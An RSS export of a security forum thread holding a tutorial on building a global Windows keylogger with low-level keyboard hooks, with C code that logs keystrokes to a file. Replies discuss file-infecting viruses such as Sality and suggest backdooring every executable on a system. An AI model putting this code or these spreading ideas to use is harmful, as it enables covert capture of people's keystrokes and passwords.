<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Windows Keylogging - Part I</title>
    <link>https://0x00sec.org/t/windows-keylogging-part-i/99</link>
    <description>S&#39;goin&#39; on guys, dtm here with a write-up on Windows keylogging.

As a promotional gift, I will be detailing a type of keylogger on the code level written in MSVC++ utilising the WinAPI.

**Disclaimer**: The following document is not newbie-friendly and requires a fair amount of knowledge of both general programming concepts and Windows internals:

	Proficiency in C/C++
	Knowledge of the WinAPI and its documentation
	Knowledge of Windows messages and message queues
	Knowledge of Windows hooks
	Some understanding of multi-threading
	Recommended knowledge of Mutual Exclusions
	Recommended knowledge of FTP
	
- - - -
	
## General Overview of Keyloggers
A keylogger is an object which, in its simplest state, tracks key presses registered by the keyboard. Note that this object can be hardware as well as software but this article will focus more on the latter. When a key is pressed, the keylogger is able to capture it and then pass it along to its original destination. Keyloggers are not always considered malware since it is dependant on the situation in which it is used. Consider the following: If a parent is concerned about their child&#39;s activity on the computer, they can easily monitor them through their keyboard input; or in a company, the employer wishes to monitor the activity of his employees to make sure that they aren&#39;t doing what they aren&#39;t supposed to do. in fact, this probably goes for all &quot;malware&quot;. Such applications may be referred to as _Possibly Unwanted Programs_ (PUP) or _Possibly Unwanted Applications_ (PUA).

In a standard console application which takes keyboard input, for example, using the _getchar_ function from the standard C library, the input from the keyboard gets buffered into the stdin where the program can fetch the character. A keylogger is not limited to its own active console window (if it even has one at all) so how are we able to globally capture keystrokes? The answer is pretty simple, actually, in fact, Microsoft has already done most of the heavy lifting for us.

- - - -

## Callback Functions
Windows applications all work in harmony using something called **messages**. These messages are all passed through the message queue and each application can detect and process its own messages. Within the applications are _callback_ functions which may be called in the event of retrieving certain messages. For example, pressing ALT+F4 in a GUI window will send a `WM_CLOSE` message into the message queue where the corresponding application&#39;s **message loop** will detect it and pass it to a [`WindowProc`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms633573%28v=vs.85%29.aspx) callback function for processing. What happens inside this function is that the message is filtered through some switch cases and in the case of a `WM_CLOSE` message, it will handle any clean ups and whatever else it needs, then it will destroy the window and also possibly exit the program. 

```c
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
		case WM_CLOSE:
			// ...
			DestroyWindow(hwnd);
	}
}
```

Additional message information may also be passed into the callback function under WPARAM and LPARAM arguments. Note that these arguments will not always be the same and can change under different callback functions.

### LowLevelKeyboardProc
There exists a callback function called [`LowLevelKeyboardProc`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985%28v=vs.85%29.aspx) and what this function does is it responds to key state changes either within a thread scope or a global scope - of course we&#39;re wanting to have a global scope for our purposes. But before we can use this function, we first need to learn about Windows hooks.

- - - -

## Windows Hooks
From the MSDN documentation on [Windows Hooks](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644959%28v=vs.85%29.aspx), &quot;*A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes. A function that intercepts a particular type of event is known as a hook procedure. A hook procedure can act on each event it receives, and then modify or discard the event.*&quot; As we can see from this description, applications are able to *&quot;intercept ... keystrokes*&quot; and that is exactly what we are aiming to do with a keylogger.

### Installing Hooks
To install a hook procedure, we must use the [`SetWindowsHookEx`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990%28v=vs.85%29.aspx) function to install a hook like so:

```c
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	// ...
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// ...
	
	SetWindowsHookEx(idHook, (HOOKPROC)HookProc, hMod, dwThreadId);
	
	// this is our message loop to receive messages from the queue
	MSG msg;
	BOOL bRet;
	while ((bRet = GetMessage(&amp;msg, NULL, 0, 0)) != 0) {
		if (bRet == -1) {
			// handle error
		} else {
			TranslateMessage(&amp;msg);
			DispatchMessage(&amp;msg);
		}
	}
	
	return 0;
}
```

Here, we would define a callback function `HookProc` and use a call to `SetWindowsHookEx` to install a hook so that our function can intercept and handle the hook procedure of type `idHook`. In the HookProc, we are highly recommended to call [`CallNextHookEx`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644974%28v=vs.85%29.aspx) to be able to pass the hooked information onwards to the next existing hook procedure. 

Let&#39;s finally get our hands dirty by writing a prototype.

- - - -

## Keylogger Prototyping
**Disclaimer**: The following code snippets will not contain any error checking for the sake of readability.

We now know what we need to set up a function to intercept keystrokes from the information provided above. It should look a little something like this:

```c
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	// ...
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// ...
	
	SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hModule, 0);
	
	// message loop here
}
```

For our `SetWindowsHookEx`, we require the `idHook` parameter to be `WH_KEYBOARD_LL` since it has a global scope. For our dwThreadId parameter, we set it to 0 since this will allow our hook procedure to be associated will all existing threads running on the same desktop as our application. As of yet, our keylogger is useless to us since we have not implemented any method to store the keystrokes.

### Writing Keystrokes to Disk
First, we need to know about the arguments which are passed into the `LoweLevelKeyboardProc` function. 

According to the MSDN documentation for the `LowLevelKeyboardProc` function, `nCode` will hold the value `HC_ACTION` if *&quot; `wParam` and `lParam` parameters contain information about a keyboard message&quot;*. So only when `nCode` is equal to `HC_ACTION` will we need to write to the file, else we do not care. Once we have such a situation, we will need to check the `wParam` and `lParam` for information about the keypress. `wParam` contains information about how the key was pressed such as a key down or key up. `lParam` is documented as a pointer to a [`KBDLLHOOKSTRUCT`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644967%28v=vs.85%29.aspx) which contains the respective [`vkCode`](https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx) of the keypress.

```c
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
			DWORD vkCode = kbd-&gt;vkCode;
			
			if (vkCode &gt;= 0x30 &amp;&amp; vkCode &lt;= 0x5A) {
				FILE *fp = fopen(KEYLOG_FILE, &quot;a+&quot;);
				
				fputc(vkCode, fp);
				
				fclose(fp);
			}
		}
	}
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
```

We can typecase the `lParam` as a pointer to a `KBDLLHOOKSTRUCT` and assign it to a variable `kbd`. For this example, we only test for basic input which includes keys ranging from `0-9` and `A-Z`. Of course, right now there is a lot missing detail with regards to other keys such as `ALT`, `CTRL` and `SHIFT` and also that it cannot differentiate upper and lower case and symbols. We can easily fix this by manually adding in some tests and switch statements until it reaches our satisfaction. Once we have extracted the `vkCode` member from `kbd` and it satisfies the key range, we will open our file defined by `KEYLOG_FILE` with an append mode and simply add on the `vkCode` to the end of the file.

After we&#39;ve finished what we intended to do, we can then push the keypress onwards to the next hook procedure.

- - - -

## Conclusion
In the next part I will showcase my keylogger code and briefly run through its functionality and how it&#39;s achieved. Thanks for reading and stay tuned!

*-- dtm*</description>
    
    <lastBuildDate>Tue, 04 Apr 2017 11:44:05 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/windows-keylogging-part-i/99.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/21</link>
        <pubDate>Sun, 21 Jan 2018 00:42:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-21</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[Xenyth]]></dc:creator>
        <description><![CDATA[
            <p>Thank you both of you. I will study the papers and see if I can put them into practice.<br>
Maybe I would go mega-dirty!</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/20</link>
        <pubDate>Tue, 04 Apr 2017 11:44:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-20</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Okay, I see what you mean by using mode <code>ab</code> but unfortunately, it’s not quite as simple as you think it is.</p>
<p>I’ve already documented a method for this in my paper <a href="https://0x00sec.org/t/pe-file-infection/401/25">PE File Infection</a> and have done an analysis on a simple appending virus <a href="https://0x00sec.org/t/understanding-a-win32-virus-code-analysis/1069">Understanding a Win32 Virus: Code Analysis</a> with background material <a href="https://0x00sec.org/t/understanding-a-win32-virus-background-material/1043/6">Understanding a Win32 Virus: Background Material</a>.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/19</link>
        <pubDate>Tue, 04 Apr 2017 07:54:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-19</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Hmm this indeed is an interesting concept. You could be mega dirty and just filebind everything. (This would break a lot too though).</p>
<p>You might be best off backdooring the program that opens those files, perhaps every executable on the system? Then when you open a text file, command prompt, or a spreadsheet, you are opening the payload too.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/18</link>
        <pubDate>Tue, 04 Apr 2017 06:38:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-18</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[Xenyth]]></dc:creator>
        <description><![CDATA[
            <p>Well by mentioning Sality I just wanted to give an example of a virus which doesn’t overwrite and destroy the victim file but appends to it and as the result, when you execute the infected victim file, both the victim file and the virus run.</p>
<p>But if you wish I will try to find out exactly how Sality works <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/17</link>
        <pubDate>Mon, 03 Apr 2017 19:26:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-17</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Please PM me with Win32.Sality’s code and I will get back to you on the NB article.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/16</link>
        <pubDate>Mon, 03 Apr 2017 15:50:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-16</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[Xenyth]]></dc:creator>
        <description><![CDATA[
            <p>Of course (and thanks for the advice)</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="http://web.archive.org/web/20160204032115/http://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0xfe-its-alive-our-first-malware-0167612/" target="_blank" rel="noopener nofollow ugc">WonderHowTo</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/323;"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a_2_690x323.jpeg" class="thumbnail" width="690" height="323" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a_2_690x323.jpeg, https://0x00sec.s3.amazonaws.com/optimized/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a_2_1035x484.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a_2_10x10.png"></div>

<h3><a href="http://web.archive.org/web/20160204032115/http://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0xfe-its-alive-our-first-malware-0167612/" target="_blank" rel="noopener nofollow ugc">Security-Oriented C Tutorial 0xFE - It's Alive!! - Our First Malware</a></h3>

<p>Welcome, to our first malware tutorial! Just a heads up, if you have yet to complete up to and including Tutorial 0x15 - File I/O, I suggest doing so before continuing. CAUTION Before proceeding beyond this point, you must understand the risk of...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/15</link>
        <pubDate>Mon, 03 Apr 2017 15:11:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-15</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <aside class="quote group-VIP" data-username="dtm" data-post="11" data-topic="99" data-full="true">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/dtm/40/6409_2.png" class="avatar"> dtm:</div>
<blockquote>
<p>Thanks for the support but the series has been concluded. There are no missing articles there, only missing information on the higher numbered ones.</p>
</blockquote>
</aside>
<p>I don’t know if he even remembers the exact content of each article. If you can link to the article on <a href="http://archive.org">archive.org</a> it might give you a better chance of reply.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/14</link>
        <pubDate>Mon, 03 Apr 2017 14:42:49 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-14</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[Xenyth]]></dc:creator>
        <description><![CDATA[
            <p>Hello <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a><br>
I could find the original articles from Security-Oriented C series using “<a href="http://Archive.org" rel="nofollow noopener">Archive.org</a>”.<br>
And I wanted to ask you a question (sorry if I’m posting this at the wrong place).</p>
<p>In tutorial 0xFE (It lives), I tried to use append binary “ab” mode instead of “wb” mode so that the infected file could run itself and then the virus, but only the victim file  executed.</p>
<p>Is it related to EOF at the end of the (original) infected file?<br>
How can I make it work, something like Win32.Sality?</p>
<p>Thanks for the series and I’m eagerly willing to see your answer <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/13</link>
        <pubDate>Mon, 03 Apr 2017 12:50:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-13</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[tux]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for your help.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/12</link>
        <pubDate>Mon, 26 Sep 2016 15:10:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-12</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for the support but the series has been concluded. There are no missing articles there, only missing information on the higher numbered ones.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/11</link>
        <pubDate>Mon, 26 Sep 2016 10:54:30 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-11</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[tux]]></dc:creator>
        <description><![CDATA[
            <p>Especially from 0x0c tutorial to end tutorial.But if someone backed up of them I need all of them.Because they were absolutely excellent articles.I’ve really liked them.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/10</link>
        <pubDate>Mon, 26 Sep 2016 09:04:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-10</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>I don’t have a back up of them but somebody else might. Which ones were you specifically looking for?</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/9</link>
        <pubDate>Mon, 26 Sep 2016 00:12:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-9</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[tux]]></dc:creator>
        <description><![CDATA[
            <p>They were great series.I want to read all you’ve written but not in Null Byte.So do you have word documents of these written series.If yes,can you send me please?</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/8</link>
        <pubDate>Sun, 25 Sep 2016 15:26:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-8</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>I’ve discontinued that series.</p>
<p><a class="mention" href="https://0x00sec.org/u/oaktree">@oaktree</a> <span class="mention">@unh0lys0da</span> <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a></p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/7</link>
        <pubDate>Sun, 25 Sep 2016 09:55:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-7</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[tux]]></dc:creator>
        <description><![CDATA[
            <p>Hello <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a>  I’ve been reading your Security-Oriented C tutorial since Null Byte didn’t change their theme.Since they changed the website your tutorials is lacking some parts.Like this article : <a href="http://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0xf9-spy-with-my-little-program-keylogging-101-0169950/" rel="nofollow noopener">http://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0xf9-spy-with-my-little-program-keylogging-101-0169950/</a></p>
<p>Not just your tutorials,OccupyTheWeb and the others’ articles have same problem.</p>
<p>Where can I find your full Security-Oriented C tutorials?</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/6</link>
        <pubDate>Sun, 25 Sep 2016 08:16:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-6</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>This really changed how we do things! The old way was cool! <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/5</link>
        <pubDate>Thu, 28 Jul 2016 05:47:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-5</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Great article DTM! I’m sure it’ll help a lot of people out!</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/4</link>
        <pubDate>Mon, 02 May 2016 14:44:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-4</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>I think I prefer posting onto the forum from now on. You could just modify the one on the front page or remove it entirely.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/3</link>
        <pubDate>Mon, 02 May 2016 10:18:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-3</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Nice article, although only the first paragraph and link to the real article original article on the main page should be supplied.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-i/99/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-i/99/2</link>
        <pubDate>Mon, 02 May 2016 10:02:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-99-2</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-i/99.rss">Windows Keylogging - Part I</source>
      </item>
      <item>
        <title>Windows Keylogging - Part I</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>S’goin’ on guys, dtm here with a write-up on Windows keylogging.</p>
<p>As a promotional gift, I will be detailing a type of keylogger on the code level written in MSVC++ utilising the WinAPI.</p>
<p><strong>Disclaimer</strong>: The following document is not newbie-friendly and requires a fair amount of knowledge of both general programming concepts and Windows internals:</p>
<pre><code>Proficiency in C/C++
Knowledge of the WinAPI and its documentation
Knowledge of Windows messages and message queues
Knowledge of Windows hooks
Some understanding of multi-threading
Recommended knowledge of Mutual Exclusions
Recommended knowledge of FTP
</code></pre>
<hr>
<h2>General Overview of Keyloggers</h2>
<p>A keylogger is an object which, in its simplest state, tracks key presses registered by the keyboard. Note that this object can be hardware as well as software but this article will focus more on the latter. When a key is pressed, the keylogger is able to capture it and then pass it along to its original destination. Keyloggers are not always considered malware since it is dependant on the situation in which it is used. Consider the following: If a parent is concerned about their child’s activity on the computer, they can easily monitor them through their keyboard input; or in a company, the employer wishes to monitor the activity of his employees to make sure that they aren’t doing what they aren’t supposed to do. in fact, this probably goes for all “malware”. Such applications may be referred to as <em>Possibly Unwanted Programs</em> (PUP) or <em>Possibly Unwanted Applications</em> (PUA).</p>
<p>In a standard console application which takes keyboard input, for example, using the <em>getchar</em> function from the standard C library, the input from the keyboard gets buffered into the stdin where the program can fetch the character. A keylogger is not limited to its own active console window (if it even has one at all) so how are we able to globally capture keystrokes? The answer is pretty simple, actually, in fact, Microsoft has already done most of the heavy lifting for us.</p>
<hr>
<h2>Callback Functions</h2>
<p>Windows applications all work in harmony using something called <strong>messages</strong>. These messages are all passed through the message queue and each application can detect and process its own messages. Within the applications are <em>callback</em> functions which may be called in the event of retrieving certain messages. For example, pressing ALT+F4 in a GUI window will send a <code>WM_CLOSE</code> message into the message queue where the corresponding application’s <strong>message loop</strong> will detect it and pass it to a <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms633573%28v=vs.85%29.aspx"><code>WindowProc</code></a> callback function for processing. What happens inside this function is that the message is filtered through some switch cases and in the case of a <code>WM_CLOSE</code> message, it will handle any clean ups and whatever else it needs, then it will destroy the window and also possibly exit the program.</p>
<pre><code class="lang-auto">LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
		case WM_CLOSE:
			// ...
			DestroyWindow(hwnd);
	}
}
</code></pre>
<p>Additional message information may also be passed into the callback function under WPARAM and LPARAM arguments. Note that these arguments will not always be the same and can change under different callback functions.</p>
<h3>LowLevelKeyboardProc</h3>
<p>There exists a callback function called <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985%28v=vs.85%29.aspx"><code>LowLevelKeyboardProc</code></a> and what this function does is it responds to key state changes either within a thread scope or a global scope - of course we’re wanting to have a global scope for our purposes. But before we can use this function, we first need to learn about Windows hooks.</p>
<hr>
<h2>Windows Hooks</h2>
<p>From the MSDN documentation on <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644959%28v=vs.85%29.aspx">Windows Hooks</a>, “<em>A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes. A function that intercepts a particular type of event is known as a hook procedure. A hook procedure can act on each event it receives, and then modify or discard the event.</em>” As we can see from this description, applications are able to <em>"intercept … keystrokes</em>" and that is exactly what we are aiming to do with a keylogger.</p>
<h3>Installing Hooks</h3>
<p>To install a hook procedure, we must use the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990%28v=vs.85%29.aspx"><code>SetWindowsHookEx</code></a> function to install a hook like so:</p>
<pre><code class="lang-auto">LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	// ...
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// ...
	
	SetWindowsHookEx(idHook, (HOOKPROC)HookProc, hMod, dwThreadId);
	
	// this is our message loop to receive messages from the queue
	MSG msg;
	BOOL bRet;
	while ((bRet = GetMessage(&amp;msg, NULL, 0, 0)) != 0) {
		if (bRet == -1) {
			// handle error
		} else {
			TranslateMessage(&amp;msg);
			DispatchMessage(&amp;msg);
		}
	}
	
	return 0;
}
</code></pre>
<p>Here, we would define a callback function <code>HookProc</code> and use a call to <code>SetWindowsHookEx</code> to install a hook so that our function can intercept and handle the hook procedure of type <code>idHook</code>. In the HookProc, we are highly recommended to call <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644974%28v=vs.85%29.aspx"><code>CallNextHookEx</code></a> to be able to pass the hooked information onwards to the next existing hook procedure.</p>
<p>Let’s finally get our hands dirty by writing a prototype.</p>
<hr>
<h2>Keylogger Prototyping</h2>
<p><strong>Disclaimer</strong>: The following code snippets will not contain any error checking for the sake of readability.</p>
<p>We now know what we need to set up a function to intercept keystrokes from the information provided above. It should look a little something like this:</p>
<pre><code class="lang-auto">LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	// ...
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

